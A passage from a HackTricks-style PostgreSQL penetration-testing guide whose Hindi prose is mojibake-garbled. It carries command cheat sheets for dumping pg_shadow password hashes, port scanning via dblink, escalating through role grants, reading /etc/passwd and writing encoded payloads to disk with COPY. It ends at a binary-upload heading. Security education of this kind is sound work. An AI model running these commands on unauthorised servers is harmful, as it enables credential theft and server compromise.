# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░ рд╕рдХреЗрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## **рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА**

**PostgreSQL** рдХреЛ рдПрдХ **рдСрдмреНрдЬреЗрдХреНрдЯ-рд░рд┐рд▓реЗрд╢рдирд▓ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рд┐рд╕реНрдЯрдо** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **рдУрдкрди рд╕реЛрд░реНрд╕** рд╣реИред рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рди рдХреЗрд╡рд▓ SQL рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдЗрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрдврд╝рд╛рддрд╛ рд╣реИред рдЗрд╕рдХреА рдХреНрд╖рдорддрд╛рдПрдБ рдЗрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдбреЗрдЯрд╛ рдФрд░ рд╕рдВрдЪрд╛рд▓рди рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдФрд░ рд╕рдВрдЧрдардиреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдкрд░рдХрд╛рд░реА рд╡рд┐рдХрд▓реНрдк рдмрдирддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 5432, рдФрд░ рдпрджрд┐ рдпрд╣ рдкреЛрд░реНрдЯ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ рддреЛ рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрдПрд╕рдХреНрдпреВрдПрд▓ рдЕрдЧрд▓рд╛ рдкреЛрд░реНрдЯ (рд╕рдВрднрд╡рддрдГ 5433) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реИред
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## рдХрдиреЗрдХреНрдЯ рдФрд░ рдмреЗрд╕рд┐рдХ рдПрдирдо
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
рдпрджрд┐ **`\list`** рдЪрд▓рд╛рддреЗ рд╕рдордп рдЖрдкрдХреЛ **`rdsadmin`** рдирд╛рдордХ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдПрдХ **AWS postgresql рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЕрдВрджрд░ рд╣реИрдВред
{% endhint %}

**PostgreSQL рдбреЗрдЯрд╛рдмреЗрд╕** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ**

[**рдЗрд╕ рд╢реЛрдз**](https://www.exploit-db.com/papers/13084) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЬрдм рдПрдХ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдпрд╛рд╕ рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, `dblink` рдПрдХ `sqlclient_unable_to_establish_sqlconnection` рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рддреНрд░реБрдЯрд┐ рдХрд╛ рд╡рд┐рд╡рд░рдг рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВред
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* рд╣реЛрд╕реНрдЯ рдбрд╛рдЙрди рд╣реИ

`DETAIL: рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реЛ рд╕рдХрд╛: рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдорд╛рд░реНрдЧ рдирд╣реАрдВ рд╣реИ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рд╣реЛрд╕реНрдЯ "1.2.3.4" рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреЛрд░реНрдЯ 5678 рдкрд░ TCP/IP рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ?`

* рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
or
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL рдлрд╝рдВрдХреНрд╢рдВрд╕ рдореЗрдВ, рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдкрд╡рд╛рдж рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ PostgreSQL рд╕рд░реНрд╡рд░ рддрдХ рд╕реАрдзреА рдкрд╣реБрдБрдЪ рд╣реИ, рддреЛ рдЖрдк рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╕рд┐рд╕реНрдЯрдо рддрд╛рд▓рд┐рдХрд╛рдУрдВ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╢рдмреНрджрд╕реВрдЪреА рд╣рдорд▓реЗ рдХреА рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдкрд░рд┐рдгрд╛рдо рджреЗ рд╕рдХрддрд╛ рд╣реИред

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЧрдгрдирд╛

### рднреВрдорд┐рдХрд╛рдПрдБ

| рднреВрдорд┐рдХрд╛ рдкреНрд░рдХрд╛рд░     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | рднреВрдорд┐рдХрд╛ рдХреЗ рдкрд╛рд╕ рд╕реБрдкрд░рдпреВрдЬрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ                                                                                                                        |
| rolinherit     | рднреВрдорд┐рдХрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддреА рд╣реИ рдЬрд┐рдирдХреА рдпрд╣ рд╕рджрд╕реНрдп рд╣реИ                                                                                    |
| rolcreaterole  | рднреВрдорд┐рдХрд╛ рдЕрдзрд┐рдХ рднреВрдорд┐рдХрд╛рдПрдБ рдмрдирд╛ рд╕рдХрддреА рд╣реИ                                                                                                                           |
| rolcreatedb    | рднреВрдорд┐рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛ рд╕рдХрддреА рд╣реИ                                                                                                                            |
| rolcanlogin    | рднреВрдорд┐рдХрд╛ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИред рдЕрд░реНрдерд╛рдд, рдЗрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╕рддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ                                                     |
| rolreplication | рднреВрдорд┐рдХрд╛ рдПрдХ рдкреБрдирд░реБрддреНрдкрд╛рджрди рднреВрдорд┐рдХрд╛ рд╣реИред рдПрдХ рдкреБрдирд░реБрддреНрдкрд╛рджрди рднреВрдорд┐рдХрд╛ рдкреБрдирд░реБрддреНрдкрд╛рджрди рдХрдиреЗрдХреНрд╢рди рдЖрд░рдВрдн рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдкреБрдирд░реБрддреНрдкрд╛рджрди рд╕реНрд▓реЙрдЯ рдмрдирд╛ рдФрд░ рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИред                           |
| rolconnlimit   | рдЙрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдпрд╣ рдЗрд╕ рднреВрдорд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдЕрдзрд┐рдХрддрдо рд╕рдорд╡рд░реНрддреА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред -1 рдХрд╛ рдЕрд░реНрде рд╣реИ рдХреЛрдИ рд╕реАрдорд╛ рдирд╣реАрдВред                                 |
| rolpassword    | рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ (рд╣рдореЗрд╢рд╛ `********` рдХреЗ рд░реВрдк рдореЗрдВ рдкрдврд╝рддрд╛ рд╣реИ)                                                                                                        |
| rolvaliduntil  | рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп (рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ); рдпрджрд┐ рдХреЛрдИ рд╕рдорд╛рдкреНрддрд┐ рдирд╣реАрдВ рд╣реИ рддреЛ рд╢реВрдиреНрдп                                                                  |
| rolbypassrls   | рднреВрдорд┐рдХрд╛ рд╣рд░ рдкрдВрдХреНрддрд┐-рд╕реНрддрд░реАрдп рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреА рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [рдЕрдиреБрднрд╛рдЧ 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) рджреЗрдЦреЗрдВред |
| rolconfig      | рд░рди-рдЯрд╛рдЗрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбрд┐рдлрд╝реЙрд▓реНрдЯ                                                                                          |
| oid            | рднреВрдорд┐рдХрд╛ рдХреА рдЖрдИрдбреА                                                                                                                                           |

#### рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣

* рдпрджрд┐ рдЖрдк **`pg_execute_server_program`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_read_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд▓рд┐рдЦ** рд╕рдХрддреЗ рд╣реИрдВ

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Postgres рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛**, рдПрдХ **рд╕рдореВрд╣** рдФрд░ рдПрдХ **рднреВрдорд┐рдХрд╛** **рдПрдХ рд╣реА** рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕реЗ **рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдпрджрд┐ рдЖрдк рдЗрд╕реЗ **рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ**ред
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### рддрд╛рд▓рд┐рдХрд╛рдПрдБ
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### рдХрд╛рд░реНрдп
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## рдлрд╝рд╛рдЗрд▓-рдкреНрд░рдгрд╛рд▓реА рдХреНрд░рд┐рдпрд╛рдПрдБ

### рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реЗрдВ

рдЗрд╕ [**рдХрдорд┐рдЯ** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд **`DEFAULT_ROLE_READ_SERVER_FILES`** рд╕рдореВрд╣ (рдЬрд┐рд╕реЗ **`pg_read_server_files`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдФрд░ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд┐рд╕реА рднреА рдкрде рдкрд░ **`COPY`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рджреЗрдЦреЗрдВ `convert_and_check_filename` рдореЗрдВ `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдпреВрдЬрд░ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **CREATEROLE** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдкрдиреЗ рдЖрдк рдХреЛ рдЙрд╕ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_read_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдХреБрдЫ **рдЕрдиреНрдп postgres рдлрд╝рдВрдХреНрд╢рди** рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ **рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреЗрд╡рд▓ **рд╕реБрдкрд░рдпреВрдЬрд╝рд░реНрд╕** рдФрд░ **рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реА рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
рдЖрдк **рдЕрдзрд┐рдХ рдлрд╝рдВрдХреНрд╢рди** [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ

### рд╕рд░рд▓ рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди

рдХреЗрд╡рд▓ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдФрд░ **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдпреВрдЬрд░ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдкрдиреЗ рдЖрдк рдХреЛ рдЙрд╕ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_write_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ COPY рдирдИ рд▓рд╛рдЗрди рдХреИрд░рдХреНрдЯрд░ рдХреЛ рд╕рдВрднрд╛рд▓ рдирд╣реАрдВ рд╕рдХрддрд╛, рдЗрд╕рд▓рд┐рдП рднрд▓реЗ рд╣реА рдЖрдк рдПрдХ base64 рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, **рдЖрдкрдХреЛ рдПрдХ рд▓рд╛рдЗрди рдореЗрдВ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **`copy` рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреБрдЫ рдмрд╛рдЗрдирд░реА рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред**

### **рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛**

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдмрдбрд╝реЗ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:**

